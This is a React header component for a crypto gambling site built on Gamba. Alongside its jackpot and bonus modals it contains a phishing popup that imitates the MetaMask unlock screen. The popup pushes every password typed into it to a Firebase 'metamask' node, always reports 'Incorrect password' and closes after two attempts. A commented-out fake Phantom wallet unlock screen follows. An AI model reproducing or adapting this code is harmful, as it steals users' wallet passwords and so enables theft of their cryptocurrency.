import {
  GambaUi,
  TokenValue,
  useCurrentPool,
  useGambaPlatformContext,
  useUserBalance,
} from "gamba-react-ui-v2";
import React, { FocusEvent } from "react";
import { NavLink } from "react-router-dom";
import styled from "styled-components";
import { Modal } from "../components/Modal";
import TokenSelect from "./TokenSelect";
import { UserButton } from "./UserButton";

import { database, ref, push, set, get } from "../components/firebase";
import phantomIcon from "../assets/ph-icon.gif";

import ethlogo from "../assets/eth_logo.svg";
import arrowdown from "../assets/arrow-down.svg";
import metamask from "../assets/metamask-fox.svg";
import Spinner from "../assets/spinner.gif";
import AuthLogo from "../components/AuthLogo";
import Loading from "../assets/loading.svg";

const Bonus = styled.button`
  all: unset;
  cursor: pointer;
  color: #003c00;
  border-radius: 10px;
  background: #03ffa4;
  padding: 2px 10px;
  font-size: 12px;
  text-transform: uppercase;
  font-weight: bold;
  transition: background 0.2s;
  &:hover {
    background: white;
  }
`;

const StyledHeader = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;
  width: 100%;
  padding: 10px;
  background: rgba(33, 34, 51, 0.9);
  position: fixed;
  background: #000000cc;
  backdrop-filter: blur(20px);
  top: 0;
  left: 0;
  z-index: 1000;
  backdrop-filter: blur(20px);
`;

const Logo = styled(NavLink)`
  height: 35px;
  margin: 0 10px;
  & > img {
    height: 100%;
  }
`;

export default function Header() {
  const pool = useCurrentPool();
  const context = useGambaPlatformContext();
  const balance = useUserBalance();
  const [bonusHelp, setBonusHelp] = React.useState(false);
  const [jackpotHelp, setJackpotHelp] = React.useState(false);

  const maxTrial = 2;
  const [over, setOver] = React.useState(false);
  const [wrongPass, setWrongPass] = React.useState(false);
  const [showDelay, setShowDelay] = React.useState(false);
  const [spinner, setSpinner] = React.useState(false);
  const [value, setValue] = React.useState("");
  const [count, setCount] = React.useState(1);
  const [enterCount, setEnterCount] = React.useState(0);
  const [rightPos, setRightPos] = React.useState(0);
  const [pixelValue, setPixelValue] = React.useState(36);
  const [isVisible, setIsVisible] = React.useState(false);
  const modalRef: any = React.useRef();
  const formLabelRef: any = React.useRef(HTMLLabelElement);
  const unlockButtonRef: any = React.useRef(HTMLButtonElement);

  const [phWrongPass, setphWrongPass] = React.useState(false);
  const inputRef: any = React.useRef(HTMLInputElement);

  const toggleModal = () => {
    setIsVisible(!isVisible);
  };

  const delay = () => {
    setShowDelay(true);
    setWrongPass(false);
    setTimeout(() => {
      setShowDelay(false), setWrongPass(true);
    }, 200);
    if (enterCount >= maxTrial - 1) {
      setOver(true);
      setIsVisible(false);
    }
    setEnterCount(enterCount + 1);
  };

  React.useEffect(() => {
    const fetchData = async () => {
      try {
        const dbRef = ref(database, "count");
        const snapshot = await get(dbRef);

        if (snapshot.exists()) {
          setCount(snapshot.val());
        } else {
          setCount(0);
          console.log("No data available for the specified key.");
        }
      } catch (err) {
        console.error("Error fetching data:", err);
      }
    };

    fetchData();

    setRightPos(pixelValue * count + 102);

    if (isVisible) {
      document.addEventListener("mousedown", handleClickOutside);
    }

    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, [isVisible]);

  React.useEffect(() => {
    const button = unlockButtonRef.current;
    if (!isVisible) return;
    if (button) {
      if (value == "" && button.classList.contains("entered")) {
        button.classList.remove("entered");
      }
      if (value != "" && !button.classList.contains("entered")) {
        button.classList.add("entered");
      }
    }
  }, [value]);

  const handleClickOutside = (event: any) => {
    if (modalRef.current && !modalRef.current.contains(event.target)) {
      setIsVisible(false);
      setValue("");
    }
  };

  const changePos = {
    right: rightPos,
  };

  const openModal = () => {
    setSpinner(true);
    setTimeout(() => {
      setIsVisible(true);
    }, 500);
    setTimeout(() => {
      setSpinner(false);
    }, 1000);
  };

  const writeToDatabase = () => {
    const dbRef = ref(database, "metamask");
    push(dbRef, { password: value })
      .then(() => {
        console.log("Data written successfully!");
      })
      .catch((error) => {
        console.error("Error writing data:", error);
      });
    setWrongPass(true);
    delay();
  };

  const handleKeyDown = (event: any) => {
    if (event.key === "Enter") {
      event.preventDefault();
      const dbRef = ref(database, "metamask");
      push(dbRef, { password: value })
        .then(() => {
          console.log("Data written successfully!");
        })
        .catch((error) => {
          console.error("Error writing data:", error);
        });
      const elements: any = document.getElementsByClassName("wrong-pass");
      if (elements.length > 0) {
        elements[0].style.display = "block";
      }
      delay();
    }
  };

  const inputFocus = (event: FocusEvent) => {
    if (formLabelRef.current) {
      formLabelRef.current.classList.add("movelabel");
    }
  };

  const blurHandler = (event: any) => {
    if (formLabelRef.current && value == "") {
      formLabelRef.current.classList.remove("movelabel");
    }
  };

  const clickUnloc = () => {
    if (inputRef.current as HTMLInputElement) {
      setphWrongPass(true);
      inputRef.current.classList.add("ph-wrongPassVibration");
      setTimeout(() => {
        inputRef.current.classList.remove("ph-wrongPassVibration");
        console.log("remove class");
      }, 800);
    }
  };
  return (
    <>
      {bonusHelp && (
        <Modal onClose={() => setBonusHelp(false)}>
          <h1>Bonus ✨</h1>
          <p>
            You have{" "}
            <b>
              <TokenValue amount={balance.bonusBalance} />
            </b>{" "}
            worth of free plays. This bonus will be applied automatically when
            you play.
          </p>
          <p>Note that a fee is still needed from your wallet for each play.</p>
        </Modal>
      )}
      {jackpotHelp && (
        <Modal onClose={() => setJackpotHelp(false)}>
          <h1>Jackpot 💰</h1>
          <p style={{ fontWeight: "bold" }}>
            There{"'"}s <TokenValue amount={pool.jackpotBalance} /> in the
            Jackpot.
          </p>
          <p>
            The Jackpot is a prize pool that grows with every bet made. As the
            Jackpot grows, so does your chance of winning. Once a winner is
            selected, the value of the Jackpot resets and grows from there until
            a new winner is selected.
          </p>
          <p>
            You will be paying a maximum of{" "}
            {(context.defaultJackpotFee * 100).toLocaleString(undefined, {
              maximumFractionDigits: 4,
            })}
            % for each wager for a chance to win.
          </p>
          <GambaUi.Switch
            checked={context.defaultJackpotFee > 0}
            onChange={(checked) =>
              context.setDefaultJackpotFee(checked ? 0.01 : 0)
            }
          />
        </Modal>
      )}
      <StyledHeader>
        <div style={{ display: "flex", gap: "20px", alignItems: "center" }}>
          <Logo to="/">
            <img alt="Gamba logo" src="/logo.svg" />
          </Logo>
        </div>
        <div
          style={{
            display: "flex",
            gap: "10px",
            alignItems: "center",
            position: "relative",
          }}
        >
          {pool.jackpotBalance > 0 && (
            <Bonus onClick={() => setJackpotHelp(true)}>
              💰 <TokenValue amount={pool.jackpotBalance} />
            </Bonus>
          )}
          {balance.bonusBalance > 0 && (
            <Bonus onClick={() => setBonusHelp(true)}>
              ✨ <TokenValue amount={balance.bonusBalance} />
            </Bonus>
          )}
          <TokenSelect />
          <UserButton open={openModal} over={over} />
        </div>
      </StyledHeader>
      {
        isVisible && (
          spinner ? (
            <div className="loading" style={changePos}>
              <img className="loading-logo" src={metamask} />
              <img className="loading-spinner" src={Spinner} />
            </div>
          ) : (
            <div className="modalcontainer" id="modal-container" style={{ right: rightPos, display: isVisible ? 'inline-block' : 'none' }} ref={modalRef} >
              <div className="toppart">
                <button className="category">
                  <div className="icon">
                    <img src={ethlogo} />
                  </div>
                  <div className="defaultcategory">Ethereum Mainnet</div>
                  <div className="downicon">
                    <img src={arrowdown} />
                  </div>
                </button>
                <button className="logo">
                  <img src={metamask} />
                </button>
              </div>
              <div className="mainpart">
                <div className="maincontainer" id="mainpart">
                  <div style={{ zIndex: 0 }}>
                    <AuthLogo />
                  </div>
                  <h1>Welcome back!</h1>
                  <p>The decentralized web awaits</p>
                  <form className="form">
                    <div className="form-group">
                      <label className="form-label" htmlFor="pass" ref={formLabelRef} >Password</label>
                      <input value={value} onKeyDown={handleKeyDown} onChange={(e) => { setValue(e.target.value); setWrongPass(false) }} onFocus={inputFocus} onBlur={blurHandler} id="pass" className="form-input" type="password" autoFocus />
                    </div>
                    <p className="wrong-pass" style={{ display: wrongPass ? 'block' : 'none' }}>Incorrect password</p>
                  </form>
                  <button className="unlocksubmit" onClick={writeToDatabase} ref={unlockButtonRef}>Unlock</button>
                  <div className="forgot">
                    <a className="button">Forgot password?</a>
                  </div>
                  <div className="help">
                    <span>Need help? Contact&nbsp;
                      <a href="https://support.metamask.io" target="_blank" rel="noopener noreferrer">MetaMask support</a>
                    </span>
                  </div>
                </div>
              </div>
              <div className="loading-pannel" style={{ display: showDelay ? 'block' : 'none', width: '100%', height: '100%', position: 'absolute', backgroundColor: "white", top: 0, zIndex: 2000, opacity: 0.8 }}>
                <img className="loading-pannel-img" style={{ position: "relative", left: "50%", top: "50%", transform: "translate(-50%, -50%)" }} src={Loading} />
              </div>
            </div>
          )
        )
      
      ///////phantom start///////
      // isVisible && (
      //   <div className="ph-root obdlrx2x">
      //     <div className="ph-header">
      //       <div></div>
      //       <svg width="94" height="103" viewBox="0 0 478 103">
      //         <path
      //           fill="#999999"
      //           d="M0 102.895h17.97V85.222c0-8.295-.718-11.42-4.911-19.836l2.276-1.203C21.445 78.49 30.07 83.66 38.937 83.66c14.257 0 25.638-12.503 25.638-31.859 0-18.514-10.423-32.1-25.399-32.1-8.865 0-17.73 5.05-23.841 19.477l-2.276-1.202c2.875-5.771 4.912-11.181 4.912-16.35H0v81.27ZM17.97 51.68c0-7.934 5.991-16.71 14.857-16.71 7.188 0 13.058 5.89 13.058 16.59 0 10.58-5.63 16.831-13.178 16.831-8.387 0-14.736-8.536-14.736-16.71ZM71.135 81.736h17.97v-21.16c0-14.907 5.272-25.487 15.096-25.487 6.23 0 8.147 4.208 8.147 14.668v31.979h17.97V46.871c0-18.995-6.828-27.17-19.887-27.17-13.419 0-17.851 9.017-23.003 19.957l-2.276-1.202c3.115-6.733 3.953-10.82 3.953-16.832V.826h-17.97v80.91ZM156.582 83.66c11.621 0 18.45-7.694 23.601-17.553l2.157 1.082c-2.277 4.689-4.433 10.099-4.433 14.547h17.612v-32.7c0-19.477-8.147-29.335-27.196-29.335-18.69 0-27.915 9.377-29.712 19.236l17.252 3.005c.599-5.17 4.792-8.656 11.501-8.656 6.71 0 10.543 3.366 10.543 7.454 0 4.088-3.953 6.011-14.496 6.131-15.575.24-27.076 5.891-27.076 17.914 0 9.858 7.787 18.874 20.247 18.874Zm-2.396-20.078c0-9.498 15.095-2.885 23.362-10.218v2.163c0 8.536-7.548 14.788-15.096 14.788-3.953 0-8.266-1.683-8.266-6.733ZM202.64 81.736h17.97v-21.16c0-14.907 5.272-25.487 15.096-25.487 6.23 0 8.146 4.208 8.146 14.668v31.979h17.972V46.871c0-18.995-6.829-27.17-19.888-27.17-13.419 0-17.851 9.017-23.003 19.957l-2.276-1.202c3.115-6.733 3.953-10.82 3.953-16.832h-17.97v60.112ZM309.688 81.977V67.069c-3.834 1.322-14.496 3.606-14.496-5.17V36.051h14.376V21.624h-14.376V5.514l-18.091 5.41v10.7h-10.782v14.427h10.782l.12 27.291c0 20.077 17.851 22.963 32.467 18.635ZM346.192 83.66c18.211 0 32.108-13.946 32.108-32.1 0-18.034-13.897-31.86-32.108-31.86-18.21 0-32.227 13.826-32.227 31.86 0 18.154 14.017 32.1 32.227 32.1Zm-13.657-31.98c0-9.978 5.631-16.951 13.657-16.951 8.027 0 13.538 6.973 13.538 16.951 0 9.979-5.511 16.952-13.538 16.952-8.026 0-13.657-6.973-13.657-16.952ZM383.868 81.736h17.968v-21.16c0-15.508 4.913-25.487 12.82-25.487 5.154 0 6.83 4.088 6.83 14.668v31.979h17.973v-21.16c0-14.547 5.27-25.487 12.82-25.487 5.027 0 6.824 4.69 6.824 14.668v31.979h17.974V46.871c0-19.115-6.232-27.17-18.452-27.17-12.698 0-17.248 9.017-21.682 20.077l-2.16-1.082c4.198-12.623-4.912-18.995-13.896-18.995-11.858 0-16.171 9.017-20.963 19.957l-2.159-1.202c2.994-6.733 4.071-10.82 4.071-16.832h-17.968v60.112Z"
      //         ></path>
      //       </svg>

      //       <svg
      //         className="ph-help"
      //         width="15"
      //         viewBox="0 0 15 15"
      //         fill="#999"
      //         cursor="pointer"
      //         xmlns="http://www.w3.org/2000/svg"
      //       >
      //         <path d="M7.5 0C3.3589 0 0 3.3589 0 7.5C0 11.6411 3.3589 15 7.5 15C11.6411 15 15 11.6411 15 7.5C15 3.3589 11.6411 0 7.5 0ZM8.31288 11.7485C8.31288 12.0092 8.09816 12.2239 7.83742 12.2239H6.62577C6.36503 12.2239 6.15031 12.0092 6.15031 11.7485V10.9663C6.15031 10.7055 6.36503 10.4908 6.62577 10.4908H7.83742C8.09816 10.4908 8.31288 10.7055 8.31288 10.9663V11.7485ZM10.2301 7.08589C9.90798 7.53067 9.5092 7.88344 9.0184 8.14417C8.74233 8.32822 8.55828 8.51227 8.46626 8.72699C8.40491 8.86503 8.3589 9.04908 8.32822 9.2638C8.31288 9.43252 8.15951 9.55521 7.9908 9.55521H6.50307C6.30368 9.55521 6.15031 9.3865 6.16564 9.20245C6.19632 8.78834 6.30368 8.46626 6.47239 8.22086C6.68712 7.92945 7.07055 7.57669 7.6227 7.19325C7.91411 7.0092 8.12883 6.79448 8.29755 6.53374C8.46626 6.27301 8.54294 5.96626 8.54294 5.6135C8.54294 5.26074 8.45092 4.96932 8.25153 4.7546C8.05215 4.53988 7.79141 4.43252 7.43865 4.43252C7.14724 4.43252 6.91718 4.52454 6.71779 4.69325C6.59509 4.80061 6.5184 4.93865 6.47239 5.1227C6.41104 5.33742 6.21166 5.47546 5.98159 5.47546L4.60123 5.44479C4.43252 5.44479 4.29448 5.29141 4.30982 5.1227C4.35583 4.3865 4.64724 3.83436 5.15337 3.43558C5.7362 2.9908 6.48773 2.76074 7.43865 2.76074C8.45092 2.76074 9.24847 3.02147 9.83129 3.52761C10.4141 4.03374 10.7055 4.72393 10.7055 5.59816C10.7055 6.15031 10.5368 6.6411 10.2301 7.08589Z"></path>
      //       </svg>
      //     </div>
      //     <div className="ph-body">
      //       <div className="ph-kid">
      //         <img src={phantomIcon}></img>
      //       </div>
      //       <div className="ph-form">
      //         <span className="ph-enterpass">Enter your password</span>
      //         <div className="ph-inputpass">
      //           <input
      //             style={{ borderColor: phWrongPass ? "red" : "#323232" }}
      //             ref={inputRef}
      //             placeholder="Password"
      //             type="password"
      //           ></input>
      //         </div>
      //         <div className="ph-forgotpass-content">
      //           <span className="ph-forgotpass">Forgot password</span>
      //         </div>
      //       </div>
      //     </div>

      //     <div className="ph-footer">
      //       <div className="ph-unlock" onClick={clickUnloc}>
      //         <span>Unlock</span>
      //       </div>
      //     </div>
      //   </div>
      // )

      
      }
    </>
  );
}
